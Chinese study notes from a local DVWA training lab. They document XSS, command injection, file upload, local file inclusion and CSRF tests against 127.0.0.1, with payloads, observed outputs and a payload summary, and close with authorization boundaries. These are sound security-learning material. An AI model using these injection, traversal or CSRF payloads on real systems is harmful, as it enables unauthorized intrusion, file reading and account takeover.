# DVWA 第二阶段学习笔记：XSS / 命令注入 / 文件上传 / 文件包含 / CSRF

> 日期：2026-05-16  
> 环境：Kali Linux / Docker / DVWA / Burp Suite  
> 目标地址：`http://127.0.0.1:8080`  
> 安全等级：Low  
> 范围：本地 DVWA 靶场，仅用于合法学习和安全测试。

## 说明

本笔记整理第二阶段的验证过程、Payload、成功标志和风险理解。内容只适用于本地 DVWA、自己的实验环境或明确授权的测试环境。

## 学习总览

本阶段学习模块：

- Reflected XSS：反射型 XSS
- Stored XSS：存储型 XSS
- DOM XSS：DOM 型 XSS
- Command Injection：命令注入
- File Upload：文件上传漏洞
- File Inclusion / LFI：文件包含漏洞
- CSRF：跨站请求伪造

学习方法：

```text
正常功能测试 -> 输入特殊内容 -> 观察页面响应 -> 判断漏洞是否成立 -> 理解风险影响
```

## 模块速查表

| 模块 | 作用位置 | 简介 | 关键参数 | 测试方法 | 成功判断 | 典型现象 |
| --- | --- | --- | --- | --- | --- | --- |
| Reflected XSS | URL 参数回显位置 | 输入通过请求传给服务器后立即反射到页面 | `name` | 输入普通文本、HTML 标签、`script` 和事件型 Payload | 浏览器执行输入中的脚本 | `alert(1)` 弹窗，`document.domain` 显示 `127.0.0.1` |
| Stored XSS | 留言保存和展示位置 | Payload 被保存到后端，其他用户访问页面时触发 | `txtName`, `mtxMessage` | 提交普通留言，再提交脚本内容并刷新页面 | 刷新后仍然自动触发脚本 | Guestbook 中保存的 `<script>alert(1)</script>` 持续弹窗 |
| DOM XSS | 前端 JavaScript 写入 DOM 的位置 | 前端读取 URL 参数并写入页面，写入不安全会执行脚本 | `default` | 修改 `default` 参数，测试闭合标签和脚本注入 | 参数在浏览器端被解析执行 | `English</option></select><script>alert(1)</script>` 触发弹窗 |
| Command Injection | 系统命令拼接位置 | 用户输入被拼接进系统命令，导致额外命令执行 | `ip`, `Submit` | 输入正常 IP，再拼接 `; whoami`、`&& whoami` 等 | 页面输出额外命令结果 | 出现 `www-data`、`uid=`、`/var/www/html` |
| File Upload | 上传接口和上传目录 | 文件类型、内容或执行权限限制不严格 | `uploaded`, `Upload` | 上传 JPG、TXT、HTML、PHP 并访问上传路径 | 上传脚本可被服务器执行 | 访问 `test.php` 显示 `PHP upload test success` |
| File Inclusion / LFI | 文件加载参数 | 用户可控制服务器加载的文件路径 | `page` | 正常加载 `file1.php`，再测试目录穿越读取本地文件 | 页面显示服务器本地文件内容 | `../../../../../../etc/passwd` 显示系统用户内容 |
| CSRF | 已登录状态下的敏感操作 | 借用用户已登录 Cookie 触发敏感操作 | `password_new`, `password_conf`, `Change` | 观察改密 URL，构造链接直接访问 | 不经二次确认即可修改密码 | 访问构造链接后可用新密码登录 |

## Reflected XSS 反射型 XSS

模块位置：

```text
DVWA -> XSS (Reflected)
```

核心理解：反射型 XSS 是指用户输入的内容通过 URL 参数传给服务器，服务器马上把内容返回到页面中。如果页面没有正确处理这些输入，浏览器就可能把输入内容当成 JavaScript 执行。

测试过程：

```text
hello
-> 页面显示 Hello hello，说明输入存在回显

<h1>test123</h1>
-> 页面中的 test123 变成大标题，说明 HTML 标签被解析

<script>alert(1)</script>
-> 浏览器弹出 1，说明 JavaScript 被执行

<img src=x onerror=alert(1)>
-> 图片加载失败触发 onerror，浏览器弹出 1

<script>alert(document.domain)</script>
-> 弹窗显示 127.0.0.1，证明脚本运行在当前 DVWA 域下
```

结论：`name` 参数存在反射型 XSS。

## Stored XSS 存储型 XSS

模块位置：

```text
DVWA -> XSS (Stored)
```

核心理解：存储型 XSS 是指恶意内容被保存到服务器或数据库中。之后其他用户访问页面时，保存的脚本会自动执行。

测试过程：

```text
Name: test
Message: hello
-> 页面下方显示 test 和 hello，说明留言可以保存并显示

Name: xss
Message: <script>alert(1)</script>
-> 页面弹出 1

刷新页面后仍然弹出 1
-> Payload 已经被保存

Message: <script>alert(document.domain)</script>
-> 弹窗显示 127.0.0.1，说明脚本在当前 DVWA 域下执行
```

反射型 XSS 与存储型 XSS 的区别：

- 反射型 XSS：Payload 通常在 URL 参数里，用户访问一次链接触发一次。
- 存储型 XSS：Payload 被保存到后端，用户打开页面就会触发，风险通常更高。

结论：Guestbook 留言位置存在存储型 XSS。

## DOM XSS

模块位置：

```text
DVWA -> XSS (DOM)
```

核心理解：DOM XSS 的重点不是服务器返回恶意内容，而是前端 JavaScript 自己读取 URL 参数并写入页面。如果写入方式不安全，就会导致浏览器执行脚本。

参数回显测试：

```text
http://127.0.0.1:8080/vulnerabilities/xss_d/?default=test123
```

成功现象：页面中出现 `test123`，说明 `default` 参数被前端读取并处理。

基础 script 测试：

```text
http://127.0.0.1:8080/vulnerabilities/xss_d/?default=%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

解码后 Payload：

```html
<script>alert(1)</script>
```

成功现象：浏览器弹出 `1`。

闭合标签测试：

```text
http://127.0.0.1:8080/vulnerabilities/xss_d/?default=English%3C%2Foption%3E%3C%2Fselect%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

解码后 Payload：

```html
English</option></select><script>alert(1)</script>
```

成功现象：通过闭合 `option` 和 `select` 标签后插入 `script` 并执行。

结论：`default` 参数存在 DOM 型 XSS。

## Command Injection 命令注入

模块位置：

```text
DVWA -> Command Injection
```

核心理解：命令注入是指网站把用户输入拼接进系统命令里执行。如果过滤不严格，用户可以拼接额外命令，让服务器执行。

正常功能测试：

```text
127.0.0.1
```

成功现象：页面返回 ping 结果。

基础命令注入测试：

```bash
127.0.0.1; whoami
```

成功现象：页面除了 ping 结果外，还显示类似：

```text
www-data
```

说明：服务器额外执行了 `whoami` 命令。

常见连接符：

```text
;      不管前面成功或失败，都继续执行后面的命令
&&     前面的命令成功，才执行后面的命令
||     前面的命令失败，才执行后面的命令
|      管道符，把前一个命令的输出交给后一个命令
` `    命令替换
$()    命令替换
```

练习 Payload：

```bash
127.0.0.1; whoami
127.0.0.1 && whoami
aaa || whoami
127.0.0.1 | whoami
127.0.0.1; id
127.0.0.1; pwd
127.0.0.1; uname -a
```

成功标志：

```text
www-data
uid=
/var/www/html
Linux 内核信息
```

结论：IP 输入参数存在命令注入漏洞。

## File Upload 文件上传漏洞

模块位置：

```text
DVWA -> File Upload
```

核心理解：文件上传漏洞是指网站允许用户上传文件，但没有严格限制文件类型、内容或执行权限。如果上传后的脚本文件可以被访问并执行，风险会很高。

测试过程：

```text
上传 test.jpg
-> 上传成功，并可通过 /hackable/uploads/test.jpg 访问

echo "hello upload test" > test.txt
上传 test.txt
-> 访问后显示 hello upload test，说明 TXT 也可上传

echo "<h1>Hello Upload HTML</h1>" > test.html
上传 test.html
-> 浏览器解析 HTML 并显示大标题

echo "<?php echo 'PHP upload test success'; ?>" > test.php
上传 test.php
-> 访问后显示 PHP upload test success，说明 PHP 文件被服务器执行
```

判断链：

```text
test.jpg 可以上传
-> 正常上传功能存在

test.txt 可以上传
-> 文件类型限制不严格

test.html 可以上传
-> 浏览器会解析上传的 HTML 文件

test.php 可以上传
-> 脚本文件可以上传

访问 test.php 后显示 PHP upload test success
-> 服务器执行了上传的 PHP 文件
```

结论：File Upload 模块存在高风险文件上传漏洞。

## File Inclusion 文件包含漏洞 / LFI

模块位置：

```text
DVWA -> File Inclusion
```

核心理解：文件包含漏洞是指网站根据用户输入的参数去加载文件。如果没有限制文件范围，用户可能让服务器加载不该加载的文件。

正常功能测试：

```text
http://127.0.0.1:8080/vulnerabilities/fi/?page=file1.php
```

重点参数：

```text
page=file1.php
```

说明：服务器根据 `page` 参数加载对应文件。

LFI 测试：

```text
http://127.0.0.1:8080/vulnerabilities/fi/?page=../../../../../../etc/passwd
```

成功现象：页面显示类似：

```text
root:x:0:0:root:/root:/bin/bash
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
```

说明：成功读取服务器本地文件 `/etc/passwd`。

`../` 表示返回上一级目录。多个 `../` 可以不断返回上级目录，直到到达系统根目录，再访问目标文件。

结论：`page` 参数存在本地文件包含漏洞。

## CSRF 跨站请求伪造

模块位置：

```text
DVWA -> CSRF
```

核心理解：CSRF 是指用户已经登录网站后，攻击者诱导用户访问一个构造好的链接，让用户在不知情的情况下执行敏感操作。DVWA 中的示例是修改密码。

正常修改密码：

```text
New password: 123456
Confirm new password: 123456
```

修改密码后 URL 类似：

```text
http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=123456&password_conf=123456&Change=Change
```

构造 CSRF 链接：

```text
http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=admin123&password_conf=admin123&Change=Change
```

成功现象：如果当前浏览器已经登录 DVWA，访问该链接后密码会被修改为 `admin123`。

验证方式：

```text
用户名：admin
密码：admin123
```

如果可以登录，说明密码确实被修改。

CSRF 逻辑：

```text
用户已经登录 DVWA
↓
浏览器保存了登录 Cookie
↓
用户访问构造好的修改密码链接
↓
浏览器自动携带 Cookie
↓
服务器认为这是用户本人操作
↓
密码被修改
```

结论：CSRF 模块存在跨站请求伪造漏洞。

## 漏洞对比

### XSS

重点：用户输入被浏览器当成脚本执行。

核心证据：

- 弹窗 `alert(1)`
- 弹出 `document.domain`
- 刷新后仍然触发
- 闭合标签后执行脚本

### Command Injection

重点：用户输入被服务器当成系统命令的一部分执行。

核心证据：

```bash
127.0.0.1; whoami
```

页面输出：

```text
www-data
```

### File Upload

重点：网站允许上传不安全文件。

核心证据：

- TXT 可以上传
- HTML 可以上传
- PHP 可以上传
- 访问 `test.php` 后 PHP 被执行

### File Inclusion / LFI

重点：用户可以控制服务器加载哪个文件。

核心证据：

```text
page=../../../../../../etc/passwd
```

页面显示 `/etc/passwd` 内容。

### CSRF

重点：借用用户已登录身份执行操作。

核心证据：访问构造好的修改密码链接后，密码被修改。

## 常见 Payload 汇总

反射型 XSS：

```html
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<script>alert(document.domain)</script>
```

存储型 XSS：

```html
<script>alert(1)</script>
<script>alert(document.domain)</script>
```

DOM XSS：

```html
<script>alert(1)</script>
English</option></select><script>alert(1)</script>
```

编码版：

```text
English%3C%2Foption%3E%3C%2Fselect%3E%3Cscript%3Ealert(1)%3C%2Fscript%3E
```

命令注入：

```bash
127.0.0.1; whoami
127.0.0.1 && whoami
aaa || whoami
127.0.0.1 | whoami
127.0.0.1; id
127.0.0.1; pwd
127.0.0.1; uname -a
```

文件上传：

```text
test.jpg
test.txt
test.html
test.php
```

文件包含：

```text
../../../../../../etc/passwd
```

CSRF：

```text
http://127.0.0.1:8080/vulnerabilities/csrf/?password_new=admin123&password_conf=admin123&Change=Change
```

## 下次建议学习内容

建议下次学习：

1. Brute Force 暴力破解模块
2. SQL Injection Blind 盲注
3. Weak Session IDs 弱会话 ID
4. Insecure CAPTCHA
5. JavaScript 模块
6. CSP Bypass

推荐顺序：

```text
Brute Force
↓
SQL Injection Blind
↓
Weak Session IDs
↓
Insecure CAPTCHA
↓
JavaScript
↓
CSP Bypass
```

## 安全边界

今天所有内容只适用于：

- 本地 DVWA 靶场
- 自己的实验环境
- 明确授权的测试环境

不要用于：

- 未授权网站
- 公网目标
- 真实账号
- 真实业务系统

不要做：

- 破坏数据
- 上传恶意文件
- 爆破真实账号
- 获取真实服务器权限
- 横向移动
- 数据导出
